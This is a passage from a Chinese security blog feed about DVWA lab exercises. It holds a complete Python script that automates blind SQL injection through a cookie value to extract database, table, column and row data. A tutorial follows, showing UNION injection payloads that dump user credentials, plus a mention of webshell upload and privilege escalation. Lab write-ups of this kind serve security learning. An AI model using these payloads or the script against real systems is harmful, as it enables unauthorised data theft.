class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_headers</span><span class="params">(self,payload)</span>:</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">"id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c"</span>.format(payload)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> headers</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            payload = <span class="string">"1' order by &#123;0&#125;#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and length(database())=&#123;0&#125;#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                payload = <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;#"</span>.format(str(i),str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)#"</span>.format(str(i),str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#"</span>.format(table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#"</span>.format(table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)#"</span>.format(str(i),table_name,str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)#"</span>.format(column_name,table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)#"</span>.format(column_name,table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)#"</span>.format(column_name,str(i),table_name,str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-SQL_Injection(SQL注入)</title>
      <link href="/2019/10/28/DVWA-SQL-Injection/"/>
      <url>/2019/10/28/DVWA-SQL-Injection/</url>
      
        <content type="html"><![CDATA[<p>DVWA里的SQL注入。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入分类</span><br><span class="line">按SQLMap中的分类来看，SQL注入类型有以下 5 种：</span><br><span class="line"> UNION query SQL injection（可联合查询注入） </span><br><span class="line"> Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line"> Boolean-based blind SQL injection（布尔型注入） </span><br><span class="line"> Error-based SQL injection（报错型注入）</span><br><span class="line"> Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入常规利用思路：</span><br><span class="line">1、寻找注入点，可以通过 web 扫描工具实现 </span><br><span class="line">2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 </span><br><span class="line">3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）</span><br><span class="line">4、可以通过获得的用户信息，寻找后台登录。 </span><br><span class="line">5、利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">手工注入常规思路：</span><br><span class="line">1.判断是否存在注入，注入是字符型还是数字型 </span><br><span class="line">2.猜解 SQL 查询语句中的字段数</span><br><span class="line">3.确定显示的字段顺序 </span><br><span class="line">4.获取当前数据库 </span><br><span class="line">5.获取数据库中的表 </span><br><span class="line">6.获取表中的字段名 </span><br><span class="line">7.查询到账户的数据</span><br></pre></td></tr></table></figure><h3 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h3><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>由代码可知，通过<code>REQUEST</code>方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。</p><p><strong>常见注入测试的POC：</strong></p><ul><li>… where user_id = $id   —-&gt;   … where user_id = 1 or 1024=1024</li><li>… where user_id = ‘$id’   —-&gt;   …where user_id = ‘1’ or ‘1024’=’1024’</li><li>… where user_id = “$id”   —-&gt;   … where user_id = “1” or “1024”=”1024”</li></ul><h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p><code>输入1，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgwPW6.png" alt="KgwPW6.png"></p><p><code>输入1&#39;and &#39;1&#39; =&#39;2，查询失败，返回结果为空：</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgwRt1.png" alt="KgwRt1.png"></p><p><code>输入1&#39; or &#39;1&#39;=&#39;1 页面正常，并返回更多信息，成功查询</code></p><p><img src="https://s2.ax1x.com/2019/10/28/Kg0wEd.png" alt="Kg0wEd.png"></p><p><strong><code>判断存在的是字符型注入。</code></strong></p><h4 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h4><p><code>输入1&#39; or 1=1 order by 1 #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgDOhR.png" alt="KgDOhR.png"></p><p><code>输入1&#39; or 1=1 order by 2 #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgrhUH.png" alt="KgrhUH.png"></p><p><code>输入1&#39; or 1=1 order by 3 #，查询失败： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgsUzt.png" alt="KgsUzt.png"></p><p> <code>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</code></p><h4 id="确认显示的字段顺序"><a href="#确认显示的字段顺序" class="headerlink" title="确认显示的字段顺序"></a>确认显示的字段顺序</h4><p> <code>输入1&#39; union select 1,2 #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQK7Of.png" alt="MQK7Of.png"></p><p> 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… </p><h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><p> <code>输入1&#39; union select 1,database() #，查询成功：#是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQMl7D.png" alt="MQMl7D.png"></p><p> 说明当前的数据库为dvwa。 </p><h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><p><code>输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQM7C9.png" alt="MQM7C9.png"></p><p> 说明数据库dvwa中一共有两个表，guestbook与users。 </p><h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><p><code>输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQlbm6.png" alt="MQlbm6.png"></p><p>圈起来是是字段名</p><h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p><code>输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQ1ncn.png" alt="MQ1ncn.png"></p><p> 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 </p><h3 id="级别：medium"><a href="#级别：medium" class="headerlink" 